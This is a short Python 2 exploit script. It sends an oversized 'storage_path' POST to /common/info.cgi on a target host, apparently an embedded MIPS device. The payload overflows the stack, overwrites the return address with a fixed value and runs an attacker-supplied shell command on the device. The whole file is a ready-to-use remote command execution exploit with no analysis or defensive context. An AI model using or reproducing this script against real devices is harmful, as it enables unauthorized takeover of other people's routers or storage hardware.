#!/usr/bin/env python
 
import sys
import urllib2
 
try:
    target = sys.argv[1]
    command = sys.argv[2]
except:
    print "Usage: %s <target> <command>" % sys.argv[0]
    sys.exit(1)
 
url = "http://%s/common/info.cgi" % target
 
buf  = "storage_path="      # POST parameter name
buf += "D" * (0x74944-36)   # Stack filler
buf += "\x00\x40\x5C\xEC"   # Overwrite $ra
buf += "E" * 0x28           # Command to execute must be at $sp+0x28
buf += command              # Command to execute
buf += "\x00"               # NULL terminate the command
 
req = urllib2.Request(url, buf)
print urllib2.urlopen(req).read()
